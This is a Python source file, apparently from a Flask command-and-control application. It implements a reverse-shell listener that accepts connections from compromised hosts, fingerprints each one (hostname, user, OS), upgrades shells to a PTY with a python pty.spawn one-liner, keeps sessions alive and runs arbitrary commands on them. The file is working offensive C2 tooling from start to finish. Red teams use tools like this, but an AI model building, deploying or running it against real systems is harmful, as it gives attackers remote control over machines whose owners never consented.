"""Reverse shell listener and management service."""
from __future__ import annotations

import secrets
import socket
import threading
import time
from datetime import datetime
from typing import Dict, Optional

from flask import Flask

from app.extensions import db
from app.models import ReverseShell, ShellExecution
from app.utils import clean_shell_output


class ShellConnection:
    """Represents an active reverse shell connection."""
    
    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int):
        self.conn = conn
        self.addr = addr
        self.shell_id = shell_id
        self.lock = threading.Lock()
        self.is_active = True
        self.ws_attached = False  # True when a WebSocket terminal is actively reading
        
    def send_command(self, command: str, timeout: int = 120) -> str:
        """Send command to shell and receive output.

        Args:
            command: The shell command to execute.
            timeout: Maximum seconds to wait for output (default 120 / 2 min).

        If the command does not finish within *timeout* seconds the
        connection is considered tainted (e.g. by ``sudo`` waiting for
        a password or ``ping`` running forever) and the connection is
        closed so the reverse-shell client can reconnect cleanly.
        """
        timed_out = False
        with self.lock:
            try:
                if not self.is_active:
                    return "Error: Connection is not active"

                # Drain any buffered data (e.g. from keepalive prompts)
                self.conn.settimeout(0.5)
                try:
                    while True:
                        leftover = self.conn.recv(4096)
                        if not leftover:
                            break
                except (socket.timeout, OSError):
                    pass

                # Send command
                self.conn.settimeout(timeout)
                cmd_bytes = (command.strip() + '\n').encode('utf-8')
                self.conn.sendall(cmd_bytes)

                # Receive response with hard deadline
                output = b""
                deadline = time.time() + timeout
                idle_timeout = 3  # seconds of silence to consider command done
                self.conn.settimeout(idle_timeout)

                while True:
                    remaining = deadline - time.time()
                    if remaining <= 0:
                        timed_out = True
                        break
                    try:
                        self.conn.settimeout(min(idle_timeout, remaining))
                        chunk = self.conn.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                    except socket.timeout:
                        # No data received within idle_timeout
                        if output:
                            # Got some output and then silence – command likely finished
                            break
                        # No output at all yet – keep waiting until deadline
                        continue

                output_str = output.decode('utf-8', errors='replace')
                output_str = clean_shell_output(output_str, command)

                if timed_out:
                    # Connection is tainted – close it so it can reconnect
                    self.is_active = False
                    try:
                        self.conn.close()
                    except Exception:
                        pass
                    notice = f"\n\n⚠️ Command timed out after {timeout}s. Session closed – it will reconnect automatically."
                    return output_str + notice

                return output_str
            except Exception as exc:
                self.is_active = False
                return f"Error: {exc}"
    
    def close(self):
        """Close the connection."""
        self.is_active = False
        try:
            self.conn.close()
        except Exception:
            pass


class ShellListener:
    """Manages reverse shell connections."""
    
    def __init__(self, app: Flask, port: int = 5000):
        self.app = app
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.is_running = False
        self.listener_thread: Optional[threading.Thread] = None
        self.connections: Dict[int, ShellConnection] = {}
        self.lock = threading.Lock()
        
    def start(self):
        """Start the listener in a background thread."""
        if self.is_running:
            return
        
        self.is_running = True
        self.listener_thread = threading.Thread(target=self._listen, daemon=True)
        self.listener_thread.start()
        
    def stop(self):
        """Stop the listener."""
        self.is_running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        
        # Close all active connections
        with self.lock:
            for conn in self.connections.values():
                conn.close()
            self.connections.clear()
    
    def _listen(self):
        """Main listener loop."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Bind to all interfaces (0.0.0.0) to accept reverse shell connections
            # from remote systems. This is intentional for a C2 listener.
            # In production, use firewall rules to restrict access.
            self.server_socket.bind(('0.0.0.0', self.port))  # nosec B104
            self.server_socket.listen(50)  # Allow up to 50 queued connections
            self.server_socket.settimeout(1.0)  # Timeout to check is_running periodically
            
            print(f"[*] Reverse shell listener started on port {self.port}")
            
            while self.is_running:
                try:
                    conn, addr = self.server_socket.accept()
                    # Handle connection in separate thread
                    handler_thread = threading.Thread(
                        target=self._handle_connection,
                        args=(conn, addr),
                        daemon=True
                    )
                    handler_thread.start()
                except socket.timeout:
                    continue
                except Exception as exc:
                    if self.is_running:
                        print(f"[!] Listener error: {exc}")
                    break
                    
        except Exception as exc:
            print(f"[!] Failed to start listener: {exc}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            print("[*] Reverse shell listener stopped")
    
    def _handle_connection(self, conn: socket.socket, addr: tuple):
        """Handle a new reverse shell connection."""
        ip, port = addr
        print(f"[+] New connection from {ip}:{port}")
        
        shell_id = None
        try:
            with self.app.app_context():
                # Accept any connection that arrives on the listener port.
                # This supports all shell types: Linux bash/sh, Windows
                # cmd/PowerShell, macOS zsh, Python/PHP/Ruby/Java shells,
                # netcat, Invoke-Expression loops, and any other reverse
                # shell payload.  We no longer reject silent connections
                # because many Windows payloads (e.g. PowerShell
                # Invoke-Expression loops) never send a banner and only
                # respond once a command is submitted.

                initial_banner = b""
                try:
                    conn.settimeout(3)
                    initial_banner = conn.recv(4096)
                except (socket.timeout, OSError):
                    pass

                # Optionally probe for echo — purely informational, never
                # used to reject.
                if not initial_banner:
                    try:
                        conn.sendall(b'echo SHELL_OK\r\n')
                        time.sleep(2)
                        conn.settimeout(5)
                        initial_banner = conn.recv(4096)
                    except (socket.timeout, OSError):
                        pass
                
                # Try to get system info
                try:
                    # Send info gathering commands
                    hostname = ""
                    platform = ""
                    shell_user = ""
                    default_hostname = f"host-{ip}"
                    
                    # Use unique random markers to extract clean output
                    marker_id = secrets.token_hex(4)
                    marker_start = f"C2S{marker_id}"
                    marker_end = f"C2E{marker_id}"
                    
                    def _extract_output(raw: str, marker_s: str, marker_e: str) -> str:
                        """Extract output between markers, falling back to cleaning."""
                        # Use rfind to skip the echoed command line and find
                        # the actual marker output lines.
                        s_idx = raw.rfind(marker_s)
                        e_idx = raw.rfind(marker_e)
                        if s_idx >= 0 and e_idx > s_idx:
                            extracted = raw[s_idx + len(marker_s):e_idx].strip()
                            # The extracted text may still contain echoed commands
                            # or prompt fragments. Keep only clean result lines.
                            lines = [l.strip() for l in extracted.split('\n') if l.strip()]
                            clean = []
                            for line in lines:
                                if marker_s in line or marker_e in line:
                                    continue
                                clean.append(line)
                            return clean[0] if clean else ""
                        # Fallback: clean the raw output
                        cleaned = clean_shell_output(raw).strip()
                        lines = [l for l in cleaned.split('\n') if l.strip()]
                        return lines[-1].strip() if lines else ""
                    
                    def _send_and_recv(cmd_str: str, wait: float = 1.0) -> str:
                        """Send a command and receive output.

                        Args:
                            cmd_str: The shell command to send (should end with newline).
                            wait: Seconds to wait after sending before reading. Increase
                                  for slow connections or complex commands.
                        """
                        # Drain any leftover data first
                        conn.settimeout(0.3)
                        try:
                            while True:
                                d = conn.recv(4096)
                                if not d:
                                    break
                        except (socket.timeout, OSError):
                            pass

                        conn.sendall(cmd_str.encode('utf-8'))
                        time.sleep(wait)
                        chunks = b""
                        conn.settimeout(2)
                        try:
                            while True:
                                chunk = conn.recv(4096)
                                if not chunk:
                                    break
                                chunks += chunk
                        except socket.timeout:
                            pass
                        except Exception:
                            pass
                        return chunks.decode('utf-8', errors='replace')

                    # Info gathering: use echo markers with && which works on
                    # both Unix bash/sh and Windows cmd.exe.  The `hostname`
                    # and `whoami` commands exist on all major platforms.
                    hostname_cmd = f'echo {marker_start} && hostname && echo {marker_end}\n'
                    hostname_raw = _send_and_recv(hostname_cmd)
                    hostname = _extract_output(hostname_raw, marker_start, marker_end)
                    if not hostname or hostname == "unknown":
                        hostname = default_hostname

                    # whoami exists on both Unix and Windows.  Fall back to
                    # %USERNAME% on Windows if whoami is missing.
                    user_cmd = f'echo {marker_start} && whoami && echo {marker_end}\n'
                    shell_user_raw = _send_and_recv(user_cmd)
                    shell_user = _extract_output(shell_user_raw, marker_start, marker_end)
                    if not shell_user or shell_user == "unknown":
                        # Fallback for Windows without whoami
                        fallback_cmd = f'echo {marker_start} && echo %USERNAME% && echo {marker_end}\n'
                        fb_raw = _send_and_recv(fallback_cmd)
                        fb = _extract_output(fb_raw, marker_start, marker_end)
                        if fb and fb != '%USERNAME%':
                            shell_user = fb
                        else:
                            shell_user = "unknown"

                    # OS detection: try uname first (Unix), then ver (Windows).
                    # Run them as separate commands to avoid syntax issues.
                    os_cmd = f'echo {marker_start} && uname -s && echo {marker_end}\n'
                    os_info_raw = _send_and_recv(os_cmd)
                    os_info = _extract_output(os_info_raw, marker_start, marker_end)
                    os_info_full = os_info_raw
                    if 'Linux' in os_info or 'Linux' in os_info_full:
                        platform = 'Linux'
                    elif 'Darwin' in os_info or 'Darwin' in os_info_full:
                        platform = 'macOS'
                    elif any(w in os_info_full for w in ['Windows', 'Microsoft', 'MINGW', 'MSYS', 'CYGWIN']):
                        platform = 'Windows'
                    else:
                        # uname failed — try Windows 'ver'
                        ver_cmd = f'echo {marker_start} && ver && echo {marker_end}\n'
                        ver_raw = _send_and_recv(ver_cmd)
                        if any(w in ver_raw for w in ['Windows', 'Microsoft']):
                            platform = 'Windows'
                        else:
                            platform = 'Unknown'

                    # Attempt PTY upgrade on Unix-like systems for a proper
                    # interactive shell (colour, job control, etc.)
                    # Skip for Windows shells where PTY upgrade doesn't apply.
                    if platform != 'Windows':
                        try:
                            pty_cmd = (
                                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
                                "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
                                "|| python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 2>/dev/null "
                                "|| script -qc /bin/bash /dev/null 2>/dev/null "
                                "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
                            )
                            conn.sendall(pty_cmd.encode('utf-8'))
                            time.sleep(1)
                            # Drain the PTY upgrade output
                            conn.settimeout(2)
                            try:
                                while True:
                                    d = conn.recv(4096)
                                    if not d:
                                        break
                            except (socket.timeout, OSError):
                                pass
                            # Set a generous terminal size so full-screen
                            # programs (top, htop, vim) render properly.
                            try:
                                conn.sendall(b'stty rows 50 cols 200 2>/dev/null; export TERM=xterm-256color\n')
                                time.sleep(0.3)
                                conn.settimeout(1)
                                try:
                                    conn.recv(4096)
                                except (socket.timeout, OSError):
                                    pass
                            except OSError:
                                pass
                        except Exception:
                            pass
                        
                except Exception:
                    hostname = default_hostname
                    platform = "Unknown"
                    shell_user = "unknown"
                
                # Create or update shell record – match by IP address only
                # so that reconnections from the same host (which arrive on
                # a different source port) reuse the existing record.
                shell = ReverseShell.query.filter_by(address=ip).first()
                if not shell:
                    session_id = secrets.token_urlsafe(16)
                    shell = ReverseShell(
                        session_id=session_id,
                        name=hostname or f"shell-{ip}",
                        address=ip,
                        port=port,
                        hostname=hostname,
                        platform=platform,
                        shell_user=shell_user,
                        status="connected",
                        connected_at=datetime.utcnow(),
                        last_seen=datetime.utcnow(),
                    )
                    db.session.add(shell)
                else:
                    # Reuse existing record – update port and metadata
                    shell.port = port
                    if not shell.session_id:
                        shell.session_id = secrets.token_urlsafe(16)
                    shell.status = "connected"
                    shell.disconnected_at = None
                    shell.connected_at = datetime.utcnow()
                    shell.last_seen = datetime.utcnow()
                    if hostname and hostname != default_hostname:
                        shell.hostname = hostname
                        shell.name = hostname
                    if platform and platform != 'Unknown':
                        shell.platform = platform
                    if shell_user and shell_user != "unknown":
                        shell.shell_user = shell_user
                
                db.session.commit()
                shell_id = shell.id
                
                # Store connection
                with self.lock:
                    self.connections[shell_id] = ShellConnection(conn, addr, shell_id)
                
                print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")
                
                # Keep connection alive
                while self.is_running and self.connections.get(shell_id):
                    try:
                        shell_conn = self.connections.get(shell_id)
                        # When a WebSocket terminal is attached, skip keepalive
                        # to avoid interfering with the real-time reader thread.
                        if shell_conn and shell_conn.ws_attached:
                            time.sleep(5)
                            # Still update last_seen
                            with self.app.app_context():
                                shell_record = db.session.get(ReverseShell, shell_id)
                                if shell_record:
                                    shell_record.last_seen = datetime.utcnow()
                                    db.session.commit()
                            continue

                        # Keepalive: send a no-op that is silent on all platforms.
                        # Unix: `true` produces no output.  Windows cmd: `rem`
                        # is a comment.  We try both via `||`.
                        conn.settimeout(30)
                        try:
                            conn.sendall(b'true 2>/dev/null || rem\n')
                        except (BrokenPipeError, ConnectionResetError, OSError):
                            print(f"[-] Keepalive failed for shell {shell_id} — connection broken")
                            break
                        # Drain the keepalive response so it doesn't
                        # bleed into the next real command.
                        time.sleep(0.3)
                        conn.settimeout(0.5)
                        try:
                            while True:
                                d = conn.recv(4096)
                                if not d:
                                    break
                        except (socket.timeout, OSError):
                            pass
                        time.sleep(30)
                        
                        # Update last_seen
                        with self.app.app_context():
                            shell_record = db.session.get(ReverseShell, shell_id)
                            if shell_record:
                                shell_record.last_seen = datetime.utcnow()
                                db.session.commit()
                    except (BrokenPipeError, ConnectionResetError):
                        print(f"[-] Shell {shell_id} connection reset")
                        break
                    except Exception:
                        break
                        
        except Exception as exc:
            print(f"[!] Error handling connection from {ip}:{port}: {exc}")
        finally:
            # Clean up
            if shell_id:
                with self.lock:
                    if shell_id in self.connections:
                        self.connections[shell_id].close()
                        del self.connections[shell_id]
                
                with self.app.app_context():
                    shell = db.session.get(ReverseShell, shell_id)
                    if shell:
                        shell.status = "disconnected"
                        shell.disconnected_at = datetime.utcnow()
                        db.session.commit()
                
                print(f"[-] Shell disconnected: ID {shell_id}")
    
    def execute_command(self, shell_id: int, command: str, timeout: int = 120) -> tuple[bool, str]:
        """Execute a command on a connected shell.

        The default timeout is 120 seconds (2 minutes).  If the command
        exceeds this, the underlying connection is closed so the
        reverse-shell client can reconnect cleanly.
        """
        with self.lock:
            conn = self.connections.get(shell_id)
            if not conn or not conn.is_active:
                return False, "Shell is not connected"

        output = conn.send_command(command, timeout)

        # If the connection was closed due to timeout, clean up
        if not conn.is_active:
            with self.lock:
                self.connections.pop(shell_id, None)
            with self.app.app_context():
                shell = db.session.get(ReverseShell, shell_id)
                if shell:
                    shell.status = "disconnected"
                    shell.disconnected_at = datetime.utcnow()
                    db.session.commit()
            return True, output

        return True, output
    
    def get_active_shells(self) -> list[int]:
        """Get list of active shell IDs."""
        with self.lock:
            return list(self.connections.keys())


# Global listener instance
_listener: Optional[ShellListener] = None


def get_listener(app: Flask, port: int = 5000) -> ShellListener:
    """Get or create the global listener instance."""
    global _listener
    if _listener is None:
        _listener = ShellListener(app, port)
    return _listener


def start_listener(app: Flask):
    """Start the reverse shell listener."""
    port = app.config.get('REVERSE_SHELL_PORT', 5000)
    listener = get_listener(app, port)
    listener.start()
